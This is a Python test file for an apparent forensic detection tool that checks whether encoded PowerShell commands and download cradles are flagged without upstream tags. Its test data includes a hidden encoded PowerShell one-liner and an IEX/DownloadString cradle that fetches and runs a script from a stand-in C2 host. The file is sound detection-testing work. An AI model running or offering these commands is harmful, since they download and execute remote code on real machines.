"""PowerShell candidate generation must be tag-INDEPENDENT.

The powershell_command_fact compiler scored only off upstream ttp_tags, so an encoded
one-liner the tagger missed produced no candidate. This adds a raw-command fallback: scan
the command TEXT itself for the encoded/download grammar and synthesize the validator-backed
TTP tag so it reaches validation-ready. The grammar IS in the fact, so the claim stays
existence-validatable. Universal: command grammar only, synthetic values, no case data.
"""
import json

from sift_sentinel.analysis.candidate_observations import build_candidate_observations


def _ps(**fields):
    f = {"fact_id": "p1", "source_tool": "parse_powershell_transcripts",
         "fact_type": "powershell_command_fact"}
    f.update(fields)
    return build_candidate_observations({"typed_facts": {"powershell_command_fact": [f]}})


def test_encoded_command_without_ttp_tags_reaches_validation_ready():
    # NO ttp_tags supplied -> fallback must scan the raw command
    r = _ps(command="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA")
    assert any(c["validation_ready"] for c in r["candidates"])


def test_download_cradle_without_ttp_tags_reaches_validation_ready():
    r = _ps(command="powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://staging.example-c2.net/x.ps1')\"")
    assert any(c["validation_ready"] for c in r["candidates"])


def test_raw_excerpt_carrier_also_scanned():
    r = _ps(raw_excerpt=json.dumps({"Command": "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"}))
    assert any(c["validation_ready"] for c in r["candidates"])


def test_benign_powershell_does_not_reach_validation_ready():
    r = _ps(command="powershell -Command Get-Process | Sort-Object CPU -Descending")
    assert not any(c["validation_ready"] for c in r["candidates"])


def test_existing_ttp_tag_path_still_works():
    r = _ps(command="x", ttp_tags=["encoded_command"])
    assert any(c["validation_ready"] for c in r["candidates"])
